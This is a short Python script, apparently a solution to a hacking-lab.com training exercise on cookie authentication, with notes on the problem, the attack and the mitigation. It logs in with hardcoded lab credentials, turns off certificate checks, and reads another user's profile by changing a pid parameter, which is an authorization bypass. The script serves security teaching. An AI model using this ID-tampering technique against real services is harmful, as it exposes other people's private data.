__problem__ = \
"""
Only check for authentication. No authorization.
"""

__attack__ = \
"""
Authorization by pass.
"""

__mitigation__ = \
"""
Implement authorization.
"""

import logging

import requests

from __base__ import setup_log, extract_user_info

log = logging.getLogger(__name__)


def bypass():
    user = "hacker10"
    password = "compass"
    with requests.session() as session:
        session.verify = False

        session.get(
            f"https://glocken.hacking-lab.com/12001/cookie_case6/auth_cookie6/login?username={user}&password={password}&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Fcookie_case6%252Fcookie6%252Fcontroller%253Faction%253Dprofile&send=Login"
        )
        session.get(
            "https://glocken.hacking-lab.com/12001/cookie_case6/cookie6/controller?action=profile"
        )
        r = session.get(
            "https://glocken.hacking-lab.com/12001/cookie_case6/cookie6/controller?action=profile&pid=3"
        )
        return r


if __name__ == '__main__':
    setup_log()
    r = bypass()
    user_info = extract_user_info(r)
    log.info(user_info)
